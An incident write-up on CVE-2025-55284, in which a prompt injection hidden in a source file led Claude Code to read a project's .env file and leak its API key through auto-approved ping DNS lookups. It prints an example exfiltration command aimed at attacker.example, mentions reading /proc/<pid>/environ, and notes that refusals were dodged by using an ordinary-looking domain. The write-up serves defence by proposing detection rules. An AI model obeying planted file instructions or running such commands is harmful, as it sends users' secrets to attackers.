# Prompt injection in a source file made Claude Code leak .env through ping DNS requests

- Date: 2025-06 | Agent/tool: Claude Code before v1.0.4 | Axis: inject

## What happened

Johann Rehberger (Embrace The Red) showed that text hidden inside any file Claude Code reads can hijack the agent. Claude Code auto-approves a hardcoded allowlist of commands it considers safe. The researcher dumped the system prompt, found the allowlist in the CLI source, and noticed that `ping`, `nslookup`, `host` and `dig` were on it. His proof of concept put an instruction in a source code file. When Claude analyzed the file, it read the project `.env`, embedded the API key into a ping hostname, and resolved it. The key left the machine inside a DNS query, with no approval prompt. He also leaked environment variables through `/proc/<pid>/environ`. He reported it to Anthropic on 2025-05-26. Anthropic fixed it on 2025-06-06 in v1.0.4 and it is tracked as CVE-2025-55284 (CVSS 7.1). The lesson generalizes: any auto-approved command that takes free-form text, including hostnames, is an exfiltration channel.

## How it went wrong

The attack chain at the OS level: the agent opens a poisoned file (file_open, read). The instruction inside makes the agent run an auto-approved Bash command such as `ping -c 2 <secret-substrings>.attacker.example`. The exec of `ping` is allowed by the agent's own allowlist, so no prompt fires. The hostname lookup becomes a DNS request (network_connect) to a domain the attacker controls; the DNS labels carry the secret. Every step looks ordinary on its own: reading a file, running ping, one DNS query. Only the chain is malicious. The researcher also noted the model refused obvious payloads against known pentest domains like `oast.me`, so the exfil host was an ordinary-looking domain.

## What the firewall should learn

Two rules cover this without reading the model's context. First, exec of DNS utilities (`ping`, `nslookup`, `dig`, `host`) from agent ancestry where argv holds a multi-label, high-entropy hostname should be approval_required or denied; a developer pinging `db.internal` looks nothing like `k-9f2c1a.7bd41e.attacker.example`. Second, a chain rule: file_open read of `.env` or another credential file followed by a network_connect from the same ancestry is exfiltration until proven otherwise, approval_required at minimum. Today the builtin filesystem pack reports reads of `.ssh` keys, `.aws/credentials`, `.netrc` and `.git-credentials`, but not `.env` reads, and the network pack has no rule that ties a read to a later connect. Closing that gap would have caught this PoC at the DNS exec, and the chain rule would catch the next variant whatever command it abuses.

## Sources

- [Embrace The Red: Claude Code — Data Exfiltration with DNS (CVE-2025-55284)](https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/)
- [Anthropic security advisory GHSA-x5gv-jw7f-j6xj: Permissive Default Allowlist Enables Unauthorized File Read and Network Exfiltration in Claude Code](https://github.com/anthropics/claude-code/security/advisories/GHSA-x5gv-jw7f-j6xj)
- [NVD: CVE-2025-55284](https://nvd.nist.gov/vuln/detail/CVE-2025-55284)
